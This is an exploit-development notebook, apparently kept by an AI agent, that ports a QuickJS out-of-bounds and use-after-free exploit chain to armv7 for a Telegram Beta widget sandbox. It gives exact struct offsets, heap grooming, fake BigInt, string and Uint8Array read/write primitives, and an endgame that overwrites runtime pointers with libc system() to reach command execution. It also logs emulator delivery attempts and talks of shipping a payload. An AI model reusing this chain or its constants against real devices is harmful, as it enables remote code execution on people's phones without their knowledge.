# armv7 exploit port — first results (2026-11-01)

Status: **layout verified, first leak works, UAF stage not yet reached.**
No usable device/emulator for the app; armhf app model under qemu-arm only.
arm64 payload untouched.

**2026-11-02 emulator update.** The `arm25lab` AVD (Android 7.1.1,
armeabi-v7a, SDK 25) boots with emulator **31.1.3**
(`/tmp/opencode/emulator-31.1.3`) in ~50 s; the current emulator 37.2.12
refuses ARM (`CPU Architecture 'arm' is not supported`). The app 72789
(UID 10084) is installed, root works, and `/data/data/.../files/cache4.db`
has 12 widget messages. Telegram initially **ANRs under TCG**
(`Application Not Responding`); after tapping **Wait** the chat list and the
User chat load. However, widget messages stay **“Loading widget…”**
(79448/79449) and the patched 79414 bubble is **blank**; logcat has no
`WIDGET`/`S0` markers. The app’s update prompt is “Aggiorna Telegram Beta
72799 — widgets update”, so 72789 predates/does not render the widget
payload. An **armv7 72799 build/device** is required for a real armv7 widget
exploit test; the jemalloc frame-reuse blocker above remains. The 72799
**universal base APK** (`/tmp/opencode/base72799.apk`) does contain
`lib/armeabi-v7a/libtmessages.49.so` and `minSdk 23`, but the arm25lab
`/data` is 775 MB with only 55 MB free; `adb install -r -d` fails with
“Requested internal only, but not enough space”. Even a resized AVD would
still use Android 7.1 jemalloc, so a **32-bit Android 8+ target with Scudo**
(or a real armv7 72799 device) is required. Screenshots:
`evidence/evidence_20261101/armv7_emulator_anr.png`,
`armv7_72789_blank_widget.png`, `armv7_72789_blank_79414.png`.

## Layout verification (armhf, quickjs-ng v0.17.0 source)

`lab/armv7/off_arm.c` (includes quickjs.c, compiled arm-linux-gnueabihf-gcc,
run under `qemu-arm -L /usr/arm-linux-gnueabihf`):

```
sizeof(JSValue)=8 JS_NAN_BOXING=1
JSVarRef size=24 pvalue=12 value=16 is_detached=8 var_ref_idx=16 stack_frame=20
JSObject class_id=10 shape=12 prop=16 u=24; array values=28 count=32 size=24
JSString size=24 (ENABLE_DUMPS build; device header 0x10 / data +0x10)
JSBigInt len=0 tab=4
JSStackFrame cur_func=8 arg_buf=16 var_buf=20 var_refs=24 cur_sp=40 cur_gc_obj=44
JSFunctionBytecode bcb=12 len=16 realm=48 cpool=52 arg_count=32 var_count=34 stack=38
JSContext rt=8 global_obj=256
JSRuntime mf=0 malloc_state=20 opaque=32 size=784
JSVarDef size=20 var_ref_idx=14
```

This matches `notes/armv7_quickjs_layout.md` for the critical offsets
(`pvalue 0x0C`, `class_id 0x0A`, `u 0x18`, `realm 0x30`, `rt+8`, `opaque 0x20`,
`arg_count/var_count/stack`, `JSBigInt` 32-bit limbs). Two lab-vs-report
differences: our armhf build has ENABLE_DUMPS (JSString 0x18, data at 0x18);
the device report says data +0x10. `JSStackFrame.cur_func` is at +8 in our
build (uint64 alignment), the report lists `sf+4 = cur_func.ptr`; verify on
the device/emulator before using the ctx path.

## First leak (armhf app model, 6 MiB, 500 ms)

`leak_armv7.js`: 65,533 `x` params + `y` (65,534 args), body
`if (0) eval(''); var f=()=>y; yield f;`, 1 MB b0 allocated **after g()**
(glibc brk, ascending -> b0 covers the +262 KB OOB slot).

Instrumented run (`leak_armv7_instr.log`):

```
[instr] async_func_init alloc=524340 arg_count=65534 var_count=5 stack=2 var_ref_count=3
[instr] get_var_ref NEW sf=0x4d3268 idx=65533 slot=0x40c2d02c var_ref=0x4c44c8 pvalue=0x40becff8 is_arg=1
[js] S1 V=0x4c44c8 off=258076
```

* `var_ref_count` truncates 65,539 -> **3** exactly as predicted.
* The OOB write at slot `0x40c2d02c` (= frame + 0x80028 + 4*65533) lands in
  b0 at offset 258,076 and leaks the 32-bit `JSVarRef*` **V=0x4c44c8**.
* Frame allocation is **524,340 B** (var_refs area 3*4 = 12 B).

## Not yet working: frame reuse / UAF read

The same script then frees the frame (`it.next()`), allocates
`buf2 = new ArrayBuffer(524340)` and probes the pvalue slot
(`65533*8 = 524264`) with a 1.234567 double. The probe reported
`PVOFF=524264 found=false`: **buf2 did not reuse the frame** (or the NaN-boxed
double probe is not accepted), so the fake-BigInt read was not reached and the
`P=V+0x10` (len = var_ref_idx 0xFFFD = 65,533 limbs, tab = stack_frame)
experiment is still untested.

Next steps:
1. Confirm the frame-chunk reuse on armhf (glibc bin behavior with the 1 MB b0
   still live above the frame; try freeing b0 before `it.next()`, or use the
   in-body groom; verify the JSArrayBuffer data pointer vs the frame).
2. Re-check the NaN-boxed double probe (the fake JSValue for a double is the
   raw 8 bytes; `typeof` handling may differ from the 16-byte arm64 layout).
3. Then evaluate `P=V+0x10`: if the 65,533-limb `toString` survives (heap
   contiguous), limb0 = `stack_frame`; otherwise find a smaller-len P
   (detached flags=1 gives len=1 but pvalue=&value, not the frame).
4. Port the fake indirect string / fake Uint8Array with the armv7 offsets
   (JSString header 0x10/data 0x10 on device; array values 0x1C/count 0x20).
5. Endgame: `rt+8`/`rt+0x20`, `ctx+8`, `bytecode+0x30`, armv7 Thumb PLT and
   ELF32 `.dynsym` resolver; only then a device/emulator plan for the armv7
   emulator agent.

Recommendation: do not ship an armv7 payload yet. The first primitive is
confirmed; the UAF/tag-reuse stage needs the armhf reuse issue resolved.

---

## Update 2 (same day): frame reuse, NaN-box probe, P=V+0x10

### Frame reuse is exact

Instrumented armhf run (`leak_armv7_instr.log`, `instr2.log`):

```
[instr] async_func_init alloc=524340 ptr=0x40b6d010 ...
[instr] abuf data=0x40bee010 len=1048576      # b0 (after g())
[instr] abuf data=0x40b6d010 len=524340       # buf2 -> SAME pointer as the frame
```

So the armhf UAF reuse works; the earlier `found=false` was **not** a reuse
failure.

### NaN-boxed probe: doubles are biased

`quickjs.h` NaN boxing stores doubles biased by `JS_FLOAT64_TAG_ADDEND
(0x7ff8000A)`: `__JS_NewFloat64` subtracts `0x7ff8000A<<32`. Writing raw
double bits (as the 16-byte arm64 payload did) is read back as a different
number. **Use an INT marker instead**: write `12345` as the JSValue
(`JS_MKVAL(JS_TAG_INT,12345)` = the u64 12345). The probe then finds the
frame at `PVOFF=524264` (= 65533*8), exactly as expected.

### P=V+0x10 BigInt works when V+0x12..0x13 is zero

Instrumented run (`leak_armv7b.log`): after the int probe, a fake BigInt at
`P=V+0x10` (NaN-boxed `JS_MKPTR(JS_TAG_BIG_INT,P)` = `0xFFFFFFF7_xxxxxxxx`)
gives `typeof bigint` and `toString(16)` with **hexlen=524264** (65,533
limbs), i.e. `len = var_ref_idx = 0xFFFD` and `tab = V+0x14 = stack_frame`.
The 262 KB read is inside the mapped heap, so it does not crash.

However, `len` is the **u32 at V+0x10 = var_ref_idx (u16) | padding (u16 at
V+0x12)**. The padding is uninitialized: in the clean build it can be
nonzero, making `len` huge and the `toString` allocation fail with
`InternalError: out of memory` (`leak_armv7d/e/f.log`; the appmodel then
reports a nonsensical `malloc_size` ~1.08 GB). Only the instrumented build,
where the padding happened to be 0, reached `hexlen=524264`.

### Extraction implemented, not yet validated

`leak_armv7d/e/f.js` implements the intended decode: `sf = limb0`;
`arg_buf = limb((sf-(V+0x14))/4 + 4)` (JSStackFrame.arg_buf at sf+0x10);
`pvalue = arg_buf + 65533*8`. It cannot be validated until `len` is stable,
because the limb indexing assumes the hex length is exactly 8*len (true only
when the top limb is nonzero) and the stream starts at V+0x14.

### Zero-prime attempt disturbed the capture

`leak_armv7f.js` primes 16 x 24-byte ArrayBuffers (zeroed data = class 32,
same as `JSVarRef` size 24) inside an IIFE before `var f=()=>y`. The
instrumented run then saw `get_var_ref NEW ... idx=65535 ... is_arg=0` and
crashed — the nested IIFE/prime changed the closure resolution (or a primed
block value was read as an existing var_ref at the OOB slot). Needs a
different priming strategy: prime **before `var it=g()`** (outside g), so the
arena class-32 free list is zeroed without adding a nested function inside g;
or find a different P with a deterministic small len.

### Next steps

1. Prime class-32 from the top level before `g()` (16 x `new ArrayBuffer(24)`,
   drop), then run `leak_armv7d` and check `hexlen=524264` and `sf`/`arg_buf`.
2. Validate `sf`/`arg_buf` against the instrumented frame pointer
   (0x40b6d010) and `pvalue` (0x40becff8).
3. Then port the fake indirect string (`JSString` data +0x10 on device,
   +0x18 in our ENABLE_DUMPS lab build) and fake Uint8Array
   (`u=0x18`, values 0x1C, count 0x20), then `rt+8`/`opaque 0x20`, Thumb
   PLT/ELF32 resolver.

---

## Update 3: top-level zero-prime works; decode validated; reader/writer SIGBUS

### Priming from the top level (before `var it=g()`) works

`leak_armv7g.js`: g is byte-identical to the previous variant; before `g()` the
script allocates and drops 32 x 24-byte + 8 x 32-byte + 8 x 40/48-byte
`ArrayBuffer`s (zeroed data blocks, class 32/40/48/56). Instrumented run:

```
[instr] get_var_ref NEW sf=0x4d3268 idx=65533 slot=0x40c2d02c var_ref=0x4c44c8 pvalue=0x40becff8 is_arg=1
[instr] V bytes: 00 00 00 00 00 00 00 00 00 00 00 01 f8 cf be 40 fd ff 00 00 ...
[js] S2c hexlen=524264 neg=false
```

* `idx=65533, is_arg=1` (correct capture; the earlier in-body prime gave
  65535/is_arg=0).
* `V+0x10..0x13 = fd ff 00 00` -> **len = 0xFFFD = 65,533**, padding zero.
* `hexlen=524264` even in the clean (non-instrumented) build.

### The decode is validated against the engine

Clean-build run (`leak_armv7g.log`):

```
S1 V=0x4c44c8 off=258076
S2 PVOFF=524264
S2c hexlen=524264 neg=false
S3 sf=0x4d3268 sf_off=0xed8c arg_buf=0x40b6d010 pvalue=0x40becff8
```

`sf=0x4d3268` and `pvalue=0x40becff8` are exactly the instrumented
`get_var_ref` values; `arg_buf=0x40b6d010` is exactly the measured frame
allocation pointer. The armv7 `P=V+0x10` leak -> `stack_frame` -> `arg_buf`
-> `pvalue` path is **confirmed**.

### Reader/writer: SIGBUS (pvalue corruption by the fake BigInt)

`rw_armv7.js` reaches `S2 F=0x40b6d010 pv=0x40becff8 sf=0x4d3268 hl=524264`
then dies with `SIGBUS` (qemu-arm, rc=135) in the fake-string stage.

Cause: returning the fake BigInt makes `js_dup` increment the fake refcount
at `P-4`. With `P=V+0x10`, `P-4 = V+0x0C = pvalue`, so **V->pvalue becomes
pvalue+1**. The next `f()` loads the fake JSValue from the odd address
`frame+PVOFF+1`; the ARMv7 64-bit load (LDRD or equivalent) requires
4-byte alignment -> SIGBUS. Using `PW=PVOFF+1` for the injection is therefore
not viable.

Next fix (not yet tested): do the read/write stages through a **second, fresh
var_ref/closure** (no fake-BigInt dup), whose pvalue can be computed from the
known frame: `pvalue2 = arg_buf + (arg_buf_len + var_idx2)*8` (var_buf follows
the args); or repair V->pvalue before the string stage with a write primitive
obtained another way. Another option: make the fake-BigInt value non-refcounted
(e.g., read via a fake string instead of a BigInt) once F is known.

### State

* First leak, frame reuse, INT probe, top-level prime, `P=V+0x10` BigInt and
  the `sf`/`arg_buf`/`pvalue` decode: **working on armhf**.
* Fake string/Uint8Array: not yet; blocked by the pvalue+1 misalignment.
* Endgame/Thumb resolver: not started. No emulator/phone run.

---

## Update 4: `big=null` restores pvalue — full armv7 chain works in the armhf app model

### Blocker resolved

After `big.toString(16)` and the decode, `big=null;` frees the fake BigInt.
The fake refcount at `V+0x0C` is the low 32 bits of `pvalue` (a large
positive count), so the free path only decrements it: `pvalue+1 -> pvalue`.
It does **not** reach `js_bigint_free`. The next `f()` loads from the
original even `pvalue`, and the fake-string stage proceeds.

Verified (`rw_armv7b.log`):

```
S1 V=0x4c4548 off=258076
S2 F=0x40b6d010 pv=0x40becff8 sf=0x4d3268 hl=524264
S4 readV=40624e0070624e0000000001f8cfbe40fdff000068324d00   # V bytes: pvalue 0x40becff8, stack_frame 0x004d3268
S5 write ok
S5b readback=41000000                                        # 0x41 written at F+0x2000 and read back
S6 done
```

### Full chain (armhf app model, 6 MiB, 500 ms)

`armv7_full2.js` (same prime/groom/BigInt/reader/writer, then):
`curfunc = *(sf+8)`, `bcode = *(curfunc+0x18)`, `ctx = *(bcode+0x30)`,
`rt = *(ctx+8)`, `jsf = *(rt+8)`, `base = (jsf & ~1) - 0x77e0` (**Thumb bit
in `js_def_free`**), `free = *(base+0xbfeb0)` (free@GOT),
`system = free-0x33cd0` (armhf glibc delta), then `rt+0x20 = cmdptr`,
`rt+8 = system`, free a 4096-byte string.

```
S1 V=0x4c4588 off=258076
S2 F=0x40b6d010 pv=0x40becff8 sf=0x4d3268 hl=524264
S4 readV=a0624e00d0624e0000000001f8cfbe40fdff000068324d00
S5 write ok
S5b readback=41000000
S5c curfunc=0x4e6030 bcode=0x40a2c010 ctx=0x4ca5a8 rt=0x4c1190 jsf=0x4077e1 op=0x0
S5d base=0x400000 free=0x4093e595 sys=0x4090a8c5        # Thumb bit masked from jsf
S5e rt8=0x4090a8c5 rt20=0x40b6f010
S6
S6 done
```

Proof file `proof_armv7.txt`: `uid=1000(user) gid=1000(user) ...`.

### armv7 specifics learned

* `var_ref_count` 65,539 -> 3; frame 524,340 B (arg 65,534, var 5, stack 2);
  OOB slot at `var_refs + 4*65,533`; frame reused exactly by
  `buf2 = new ArrayBuffer(524340)`.
* NaN boxing: doubles are biased (`0x7ff8000A<<32`) — use an INT marker
  (`12345`) or `__JS_NewFloat64`; fake values are
  `((uint64)tag << 32) | (uint32)ptr`.
* `P=V+0x10` fake BigInt: len = u16 var_ref_idx (0xFFFD) + u16 padding at
  V+0x12; **prime the class-32 arena from the top level** (32x24-byte
  ArrayBuffers + 8x32/40/48) so the padding is zero and len = 65,533.
  Decode: `sf = limb0`; `arg_buf = limb((sf-(V+0x14))/4 + 4)`;
  `pvalue = arg_buf + 65533*8`.
* `big=null` restores `pvalue` (free decrement, no js_bigint_free).
* Fake indirect JSString: lab build has ENABLE_DUMPS -> JSString 0x18,
  data/indirect pointer at +0x18; device report says header 0x10/data +0x10
  (use that on the emulator/device).
* Fake Uint8Array: class 24 at +0x0A, u1.typed_array at +0x18,
  u.uint8_ptr at +0x1C, count at +0x20; fake JSTypedArray buffer at +0x0C;
  fake JSArrayBuffer immutable at +0x09.
* **Thumb**: `js_def_free`/`free`/`system` pointers carry bit 0; mask it for
  the ELF base and keep it on the call target (`rt+8 = system|thumb`).

Lab constants: `appmodel_arm_now`: js_def_free=0x77e0, free@GOT=0xbfeb0,
armhf glibc `system-free=-0x33cd0`.
Device constants (report): js_def_free=0x136D1B0, free@GOT=0x1577394; the
libc delta must come from the emulator libc (the Thumb/ELF32 resolver is the
remaining device-side work).

### Remaining

* armv7 device/emulator plan: same chain with the device offsets, JSString
  header 0x10/data 0x10, and the Thumb PLT/ELF32 `.dynsym` resolver
  (`free@GOT` -> libc base -> `system`), then the emulator agent tests it.
* No emulator/phone run here; arm64 payload untouched.

---

## Update 5: emulator (armv7 device-side) attempt — blockers found, no proof yet

Target: emulator-5554, Android 7.1.1 armeabi-v7a, app 72789, widget message
79415 (User), payload delivered via `tools/widget_tool.py` (DB md5
666d23222bfd40986909f01cd711c0be). Device constants used:
`js_def_free=0x136D1B0`, `free@GOT=0x1577394`, `system-free=0x2E9D0`,
`base=(jsf&~1)-0x136D1B0`, Thumb bit kept on the call target.

### Attempt 1 (`widget_poc_1865_armv7.html`, b0 after g)

Sandbox crash, tombstone_00 23:50:51:
`SIGSEGV code 1 fault addr 0x890`, tid widget.sandbox,
backtrace `sub_133FFAC` (= get_var_ref) -> `sub_1341F28` (js_closure2) ->
`sub_1337A18` (js_closure) -> `sub_13297E0` (JS_CallInternal) -> ...
Root cause: the OOB slot read a small garbage value (0x894) and the engine
refcounted it (`*(u32*)(0x894-4)` -> fault 0x890). On bionic/Scudo
(top-down) the b0 allocated **after** `g()` is below the frame, so the
+262 KB slot missed it. The arm64 lesson applies: groom **before** g().

### Attempt 2 (`widget_poc_1865_armv7b.html`, b0a before + b0b after, scan both)

No crash; the widget ran but was stopped with
`CPU limit exceeded: more than 500 ms of continuous execution
(inline-script-1.js)`. The inline script did the 131 KB `new Function` parse,
prime/groom, leak, 65,533-limb BigInt `toString`, reader/writer and endgame
synchronously — too slow for the armv7 emulator's 500 ms/script budget.

### Attempt 3 (`widget_poc_1865_armv7c.html`, 3 timer stages)

Stage A (parse+prime+groom+leak) / B (BigInt+reader/writer) / C (endgame),
all scheduled with setTimeout; the inline script only schedules stage A.
It still hit the same CPU limit (last log 23:03:40, "inline-script-1.js"),
i.e. even the single `new Function` parse of the 65k-parameter generator
appears to exceed 500 ms continuously on the emulator (QEMU armv7 on x86),
or the timer callback is charged to the same script budget.

### Status / next steps

* No `rce_proof` from this run; the 203-byte file seen at 22:09 was stale
  (uid 10357, different app) and was deleted before testing.
* No armv7 payload should ship yet. The chain is proven in the armhf app
  model; the emulator port is blocked by the sandbox's 500 ms continuous
  CPU budget on the 65k-parameter parse, not by a memory/layout issue.
* Options: reduce the parse cost (fewer params with more capture reuse is
  not possible for the same truncation; a smaller engine-side trigger would
  be needed), pre-warm/compile the generator outside the widget sandbox
  (not allowed), or find an engine variant with a lighter first leak.
* Message 79415 was restored to `<div id="t">restored</div>` and the app
  restarted; emulator left healthy (DB md5 after restore printed by the
  push step).

---

## Update 6: emulator end-to-end attempt — exact allocator blocker (no proof)

**This supersedes Update 5's conclusion.** The 500 ms CPU budget is *not*
the blocker for the 65k-param parse. The real blocker is the Android 7.1
jemalloc size-class rounding, which keeps the OOB slot inside the
generator frame's own malloc block, out of reach of any JS ArrayBuffer.

### 6.1 CPU budget: measured, not the parse

`lab/armv7/diag_budget.html` (message 79415, emulator-5554) produced:

```
D0 P65=2384 g=function A=250 B=258 C=252 D=250
```

* The 65,533-param generator parse took **2384 ms** (1772 ms in another
  run) yet did not trip the interrupt: `new Function`/parse is C code and
  does not poll the interrupt counter.
* The four 250 ms busy loops ran in **separate inline `<script>` tags**
  (A/B/C/D) and all completed: each inline script gets a **fresh 500 ms
  deadline** from the native script loop (`sub_401198` in the arm64/lib
  reference; the armv7 loop is the same design).
* CPU-limit stops only occur in long JS bytecode loops (the 2 MB scan in
  the earlier attempt) and, under emulator load, in the sandbox
  `endTick`/`boot` scripts. The parse overrun itself is harmless because
  the script ends before the next poll.

Consequence: the earlier "parse too slow for 500 ms" reasoning was wrong;
the parse can be done in one inline script. The blocker is memory layout.

### 6.2 Big-stack frame: measured slot offset

To move the OOB slot (`var_refs + 4*65,533`) past the allocator's rounded
block, the generator body uses a dead 33,000-argument call:

```
if (Date.now() < 0) y(x,x,...,x);   // 33,000 x's, never executed
```

The parser records `stack_size`; the armhf instrumented engine reports:

```
[instr] async_func_init alloc=788340 arg_count=65534 var_count=5
        stack=33002 var_ref_count=3
```

The slot offset from the frame user data is therefore

```
8*(65534 + 5 + 33002) + 4*65533 = 1,050,460 = 0x10075C
```

This is confirmed exactly on the device tombstone (`tombstone_02`,
pid 5559, `widget.sandbox`):

```
r6 = 0x86600008   frame user data
r2 = 0x866c0770   var_refs base
r9 = 0x0000fffd   var_ref_idx 65533
slot = r2 + 4*65533 = 0x86700764 = r6 + 0x10075C
```

The crash is `pc 0x13400bc` in `get_var_ref`:
`ldr r0,[r4,#-4]` with `r4=0x00030000`, fault `0x2fffc`.

### 6.3 Why no JS buffer can cover the slot (Android 7.1 jemalloc)

`lab/armv7/diag_layout4.html` (big-stack parse, b0a=788,340 filled 0x41,
`g()` only, no `next()`) gave this device layout (pid 6340):

```
85100000-85280000  rw-p  1.5 MB  [anon:libc_malloc]   <- frame chunk
85280000-85480000  rw-p  2.0 MB  [anon:libc_malloc]   <- b0a (0x41 at +8)
```

so the frame is at `0x85100000` (user data `0x85100008`) and the slot
would be `0x85200764`. That address is **inside the same 1.5 MB
`[anon:libc_malloc]` chunk** as the frame, in its unused tail; b0a starts
at `0x85280008`, i.e. `0x7F8A4` too high to cover it.

A second zero-filled buffer allocated *after* `g()` (b0b=524,288, the
`widget_poc_1865_armv7f.html` variant) did not take the tail either: the
crash value was still `r4=0x00030000`, fault `0x2fffc` (tombstones for
pid 5128 and 5559). The slot is part of the frame's own jemalloc block,
not a free/neighbouring block the allocator will hand to a JS ArrayBuffer.

Why the size cannot be tuned out:

* The slot offset is `8*(arg+var+stack) + 4*65533`; the frame request is
  `8*(arg+var+stack) + 4*var_ref_count`.
* With the original 5 vars, `var_ref_count` truncates to 3, so the slot
  is 262,120 bytes past the request. The maximum `stack_size` is u16
  65,535; even at maximum the slot is ~1.31 MB, below the 1.5 MB class
  that jemalloc uses for the 788 KB frame.
* Adding vars raises the request and the var_refs array together; the
  slot tracks the request end and jemalloc rounds again (1.5 MB/2 MB).
  There is no `stack_size`/`var_count` combination that puts the slot
  past the rounded chunk while keeping the var-ref count small enough.

This is allocator-specific:

* armhf/glibc app model: large allocations are exact, so the slot lands
  in the adjacent 1 MB buffer and the full chain works (`armv7_full2.js`).
* arm64/Scudo device model: secondary allocations are page-rounded mmaps,
  so the slot can land in an adjacent mapping (the arm64 app-model chain;
  not proven on the phone).
* Android 7.1 armeabi-v7a emulator: jemalloc large size classes
  (1 MB/1.5 MB) round the frame up; the slot stays in the block tail.

### 6.4 What was attempted / result

* `widget_poc_1865_armv7e.html` — big-stack parse (197 KB source),
  b0a=788,340 before `g()`, zero-filled; `it.next()` still crashes in
  `get_var_ref` because the slot is in the frame chunk tail.
* `widget_poc_1865_armv7f.html` — big-stack, b0a=788,340 plus a
  zero-filled b0b=524,288 after `g()`; same crash (`r4=0x30000`,
  fault `0x2fffc`). No `rce_proof`; no false success.
* Earlier `endTick` and `boot` CPU-limit stops are load/sandbox-init
  effects on the slow TCG emulator, not the parse; the same widget
  succeeded when the emulator was less loaded.
* The emulator's `/data` filled to 96% during the repeated DB pushes;
  old sdcard DB copies, tombstones and the app cache were removed
  (86 MB free at the end). The app was left healthy.

### 6.5 Remaining options

1. **Page-rounded allocator target** (arm64 phone / Scudo, or a different
   armv7 libc): the arm64 chain is proven in the app model; the phone
   payload was not touched. This is the clean path if an arm64 device is
   in scope.
2. **Different leak primitive, not the OOB slot**: after `it.next()`
   frees the frame, `expand_fast_array` (`js_realloc`, no zeroing) can
   reuse the frame block for a fast-array values buffer; the
   uninitialized JSValue slots would expose the frame tail (including
   `V`) and bypass the slot/allocator problem. Not implemented/tested.
3. **Engine-side read of the frame block tail** (hook/patch) — outside
   the widget sandbox primitive.

### 6.6 Final emulator state

* Message 79415 restored to `<div id="t">restored</div>`; DB md5
  `d6585836f2e9762b5c3f72f57e614f52`; app pid 7374; widget renders
  `restored` (`lab/armv7/emulator_79415_restored_20261102.png`).
* No phone (<SERIAL>) and no arm64 payload was touched.
* Evidence kept in `lab/armv7/`: `diag_budget.html`,
  `diag_layout4.html`, `widget_poc_1865_armv7e.html`,
  `widget_poc_1865_armv7f.html`, `diag_budget_emulator.png`,
  `maps_layout4_1.5MB_chunk.txt`, `memscan_0x41_layout4.txt`,
  `tombstone_bigstack_pid5128.txt`, `tombstone_bigstack_pid5559.txt`,
  `memscan.c`, `memtool.c`.

---

## Update 7: `expand_fast_array` tested — not viable; armv7 image ceiling

### 7.1 Custom rounded-allocator lab (armhf, no VM)

`lab/armv7/appmodel_round.c` is a new app-model harness using
`JS_NewRuntime2` with a custom `JSMallocFunctions` that models jemalloc's
large-block rounding: requests >256 KiB round to 1 MiB / 2 MiB classes and
freed classes go on a free list (they stay mapped and are **not** zeroed on
reuse). This is the first lab model that actually keeps the OOB slot inside
the frame block, matching the Android 7.1 emulator.

`round_leak.js`:

1. parse the 65,533-param generator;
2. allocate/free two zeroed 1 MiB `ArrayBuffer`s (`z1/z2`);
3. `it = g()` — the 524,340-byte frame reuses the zeroed 1 MiB block;
4. `f = it.next().value` — the OOB slot is zero, so `get_var_ref`
   creates `V` and writes it into the block tail;
5. `it.next()` — frame freed;
6. `a=[]; a[131071]=1` — tries to get the 1 MiB fast-array values buffer
   to reuse the freed frame block.

Measured (`round3.log`):

```
[mf] reuse/alloc big ptr=0x40f8c014 size=1048576 cls=1048576
[instr] async_func_init alloc=524340 ptr=0x40f8c01c ... var_ref_count=3
[instr] get_var_ref NEW ... idx=65533 slot=0x4104c038 var_ref=0x4c457c is_arg=1
[js] array len 131072
[js] slot 98308 lo=0x0 hi=0x7ff80000
...
```

The frame did reuse the zeroed 1 MiB block and the OOB slot
(`0x4104c038` = frame + 0xC001C) was inside it, with `V=0x4c457c`.
But the fast array did **not** allocate a 1 MiB values buffer (no `[mf]`
line after the frame free), and every probed slot reads as
**`undefined`** (`Float64` high word `0x7ff80000`, low 0), not the frame
tail.

Reason: the engine initializes fast-array slots.

* `js_allocate_fast_array` allocates and fills every slot with
  `JS_UNDEFINED` (`quickjs.c`, line ~10510).
* `set_array_length` on a fast array only updates the `length` property;
  it does not grow `u.array.count`.
* `add_fast_array_element` calls `expand_fast_array`, but sets only
  `values[new_len-1]` and `count = new_len`; the uninitialized expansion
  tail is **beyond `count`** and cannot be read through JS array indexing.
* `a[131071]=1` on an empty array takes the slow/sparse path, so no 1 MiB
  values buffer is allocated at all.

**Conclusion: `expand_fast_array` / fast-array values cannot leak the
frame tail in quickjs-ng 0.17/0.18. The idea is dead.** The lab test
reproduced the rounded 1 MiB frame block and the in-block `V`, but no
JS-visible uninitialized allocation.

### 7.2 Other in-block options checked

* **Runtime argc via `apply`/spread**: `build_arg_list` rejects
  `len > JS_MAX_LOCAL_VARS` (`65535`). So the largest call has 65,535
  args; `arg_buf_len = max(65,534, 65,535) = 65,535`, only +8 bytes over
  the declared parameters. It cannot move the frame request near a size
  class boundary.
* **Static `stack_size`**: u16 max 65,535; with the original 5 vars the
  frame request maxes at 1,048,604 and the slot at 1,310,724. The observed
  jemalloc classes round 524 KB to 1 MiB and 788 KB to 1.5 MiB; the
  1.048 MB request is inside the 1.5 MiB class (at best 4 bytes past a
  1.25 MiB class, which lands in the next block's metadata, not a zeroed
  user buffer).
* **`var_count` tuning**: to push the slot past a 1.5 MiB class requires
  ~33,000 extra vars; the 6 MiB sandbox OOMs at parse
  (`InternalError: out of memory`, measured in `bigframe_test.js`).
* **ArrayBuffer resize** zeroes the grown region
  (`js_array_buffer_resize`: `memset(&data[old], 0, len-old)`); strings
  and BigInts fill their buffers; no uninitialized JS-visible allocation
  was found.

### 7.3 Newer armeabi-v7a image with Scudo

`sdkmanager --list` (SDK at `<HOME>/ailocal/old/Android/Sdk`) shows
armeabi-v7a system images only up to **android-25** (the installed
`sdk_google_phone_armv7` / `google_apis;armeabi-v7a`). android-26 and
newer list only **arm64-v8a** (and x86/x86_64) images; the installed
android-34/35 images are `arm64-v8a`. **There is no newer armeabi-v7a
Android image with Scudo available or installable.** Testing Scudo would
require an arm64 image/app, which is out of scope here and would touch
the arm64 work.

### 7.4 Emulator state

`emulator-5554` is currently **not running** (the qemu process stopped
after the last session; the host has ~4.4 GB available, but no remaining
armv7 test path justified restarting it). Last verified state before it
stopped: message 79415 restored to `<div id="t">restored</div>`, DB md5
`d6585836f2e9762b5c3f72f57e614f52`, app pid 7374, widget rendering
`restored` (`emulator_79415_restored_20261102.png`). No `rce_proof` was
produced. The phone devices were not touched; no arm64 payload was run.

### 7.5 Files added

`lab/armv7/appmodel_round.c`, `appmodel_arm_round`, `round_leak.js`,
`round3.log` (rounded-allocator lab; the log contains the frame/slot/V
addresses and the `undefined` fast-array slots).
